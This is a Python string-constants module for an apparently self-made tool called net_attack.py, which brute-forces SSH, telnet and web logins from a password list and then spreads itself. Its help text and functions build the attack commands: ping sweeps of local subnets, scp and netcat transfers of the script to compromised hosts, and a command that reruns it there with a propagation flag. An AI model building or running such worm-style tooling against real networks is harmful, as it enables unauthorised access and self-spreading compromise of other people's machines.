#!/usr/bin/python3

"""
===PLEASE READ===
String functions and constants are organised alphabetically. Every string
function has a block comment explaining what it does and where it's used and
every string constant has a comment describing its use.
"""

ARGUMENT_IP_ADDRESS_FILENAME = "-t"
ARGUMENT_PORTS = "-p"
ARGUMENT_USERNAME = "-u"
ARGUMENT_PASSWORDS_FILENAME = "-f"
ARGUMENT_SCAN_LOCAL_NETWORKS = "-L"
ARGUMENT_HELP_SHORT = "-h"
ARGUMENT_ = "-c"
ARGUMENT_HELP_LONG = "--help"
BLANK_STRING = ""
COLON = ":"
ENCODE_ASCII = "ascii"
EXITING = "Exiting..."
FAILED_ASSIGNING_VALUES = "Failed assigning values (maybe null)"
FETCHING_LOCAL_INTERFACE_LIST = "Fetching local interface list..."
FULL_STOP = "."
FILENAME_PROCESSING_ERROR = "One of the filenames are invalid."
LOGIN_PROMPT = "login:"
LOOPBACK = "lo"
MAIN = "main()"
ONE = "1"
PASSWORD_PROMPT = "Password:"
PASSWORD_PROMPT_WEB = "password:"
PASSWORDS_FILE = "passwords.txt"
PARAMETER_MISUSE = "Parameter misuse, check help text below"
PERFORMING_LOCAL_SCAN = "Performing local scan, this might take a while so " \
                        "grab a coffee..."
PING = "ping"
PING_ARGUMENT = "-c"
PLEASE_TYPE_PASSWORD_AGAIN = "Please type in this password again: "
PLS_HELP = "Parameters:\n\t-t -> Filename for a file containing a list of " \
           "target IP addresses\n\t-p -> Ports to scan on the target host" \
           "\n\t-u -> A username\n\t-f -> Filename for a file containing " \
           "a list of passwords\n\t-L -> Scans the lan across all " \
           "interfaces and creates/adds to the list of target IP addresses" \
           "\n\t-P -> Propagates the script onto available devices and " \
           "executes the script using the given command\nExample usage:\n" \
           "\t./net_attack.py -t my_ip_list.txt -p 22,23,25,80 -u admin " \
           "-f my_password_list.txt\n\n\t./net_attack.py -t ip_list.txt " \
           "-p 22 -u root -f passwords.txt"
RETURN_OR_NEWLINE = "\n"
RSA_AND_PASSWORD = "Please type in this password below and say yes to any " \
                   "RSA key prompts: "
SSH = "SSH"
SSH_PORT = "22"
SUCCESSFUL = "Successful"
SYN_FLAG = "S"
TELNET = "telnet"
UNSUCCESSFUL = "Unsuccessful"
USERNAME_PROMPT_WEB = "username:"
WEB = "web"
WELCOME_TO = "Welcome to"


def adding_address_to_interface(specific_address, interface):
    """
    This function takes a specific address and an interface and generates a
    string for declaring it was found in a given subnet
    :param specific_address: The specific target address to be added to the
    interface
    :param interface: The interface on which we're adding a specific target
    address
    :return "Adding " + str(specific_address) + " from interface "
    + str(interface) + "'s subnet.": The string in question
    """
    return "Adding " + str(specific_address) + " from interface " \
           + str(interface) + "'s subnet."


def cat_file(filename):
    """
    This function creates a command for concatenating a specific file
    :param filename: The filename of the file we want to touch
    :return "cat " + filename: The completed cat command
    """
    return "cat " + filename


def checking_ip_reachable(ip):
    """
    This function creates a string that describes the availability of a machine
    on a specific IP address
    :param ip: The specific IP address
    :return "Checking if the following ip address is reachable: " + str(ip):
    The string in question
    """
    return "Checking if the following ip address is reachable: " + str(ip)


def connection_status(service, ip, port, status):
    """
    This function creates the connection status string dependent
    on the context given by the arguments passed into it.
    """
    string = str(status) + " " + str(service) + " login to " + str(ip) + ":" \
        + str(port) \
        + " using the specified username with a password in the " \
        "passwords file."
    return string


def fetching_ips_for_interface(interface):
    """
    This function generates the string for fetching the IPs for a specific
    interface
    :param interface: The interface we're fetching IPs on
    :return "Fetching IPs for interface " + str(interface) + "...": The string
    in question
    """
    return "Fetching IPs for interface " + str(interface) + "..."


def file_present_on_host(ip):
    """
    This function generates the string for a file already present on a host
    :param ip: The host itself
    :return "A file is already present on this host: " + str(ip): The string
    in question
    """
    return "A file is already present on this host: " + str(ip)


def scp_command_string(port, username, target_ip, filename):
    """
    This function creates and SSH copy string for an OS command
    :param port: Port over which we are running the SSH copy
    :param username: The username for the SSH login
    :param target_ip: The IP address of the machine we are copying too
    :param filename: The name of the file to be copied across by SSH
    :return "scp -P " + str(port) + " " + filename + " " + username + "@" \
           + target_ip + ":~/": The SSH copy command
    """
    return "scp -P " + str(port) + " " + filename + " " + username + "@" \
           + target_ip + ":~/"


def touch_file(filename):
    """
    This function creates a command for touching a specific file
    :param filename: The filename of the file we want to touch
    :return command: The completed touch command
    """
    command = "touch " + filename
    return command


def ip_list_not_read(filename):
    """
    This function returns the error for an ip list that can't be generated from
    a particular filename
    :param filename: The filename of the file that can't have an ip list
    derived from it
    :return "IP list cannot be read from filename: " + filename: The string in
    question
    """
    return "IP list cannot be read from filename: " + filename


def ip_reachability(ip, reachable):
    """
    This function generates the string regarding the reachability of an IP i.e.
    whether it can be pinged
    :param ip: The IP being pinged
    :param reachable: Whether it is reachable
    :return str(ip) + " was reachable.": String returned if it is reachable
    :return str(ip) + " was not reachable.": String returned if it is not
    reachable
    """
    if reachable:
        return str(ip) + " was reachable."
    return str(ip) + " was not reachable."


def netcat_listener(port, filename):
    """
    This function will create a netcat listener on the device we have a telnet
    link to
    :param port: The port on which the telnet listener will operate
    :param filename: The filename of the file we're moving using the listener
    parameter
    :return "nc -l -p " + str(port) + " > " + filename: The string in question
    """
    return "nc -l -p " + str(port) + " > " + filename


def netcat_writer(ip, port, filename):
    """
    This function will create a netcat writer to write a file to a device we
    have a telnet link to
    :param ip: Machine with the telnet listener we are writing to
    :param port: The port on which the telnet writer will operate
    :param filename: The filename of the file we're moving using the writer
    parameter
    :return "nc -w 3 " + str(ip) + " " + str(port) + " < " + filename: The
    string in question
    """
    return "nc -w 3 " + str(ip) + " " + str(port) + " < " + filename


def run_script_command(filename, username):
    """
    This function will run the propagation script on another target machine
    over any service
    :param filename: The file that holds the propagation script
    :param username: The username to run against the propagation script as a
    parameter
    :return "net_attack.py -L -p 22,23 -u " + username + " -f passwords.txt
    -P": The command itself
    """
    return filename + " -L -p 22,23 -u " + username + " -f passwords.txt -P"


def web_login_url(ip, port):
    """
    This function will build the web login url string
    :param ip: The IP of the machine running the web service
    :param port: The port the web service is running on
    :return "https://" + ip + ":" + port + "/login.php": The string itself
    """
    return "https://" + ip + ":" + port + "/login.php"
